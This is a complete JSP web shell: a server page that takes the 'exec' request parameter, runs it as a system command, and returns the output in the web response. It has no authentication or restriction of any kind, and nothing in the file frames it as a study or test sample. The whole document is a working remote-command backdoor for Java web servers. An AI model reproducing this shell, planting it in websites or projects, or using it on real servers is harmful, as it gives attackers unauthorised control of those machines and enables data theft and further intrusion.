<%@page import="java.io.*"%>
<%@page import="java.util.*"%>
<%
  String cmd = request.getParameter("exec");
  if (cmd != null)
  {
      Process p;
      p = Runtime.getRuntime().exec(cmd);
      InputStreamReader isr = new InputStreamReader(p.getInputStream());
      BufferedReader br = new BufferedReader(isr);
      String line = null;
      while((line = br.readLine()) != null){
        out.println(line);
      }
  }
%>
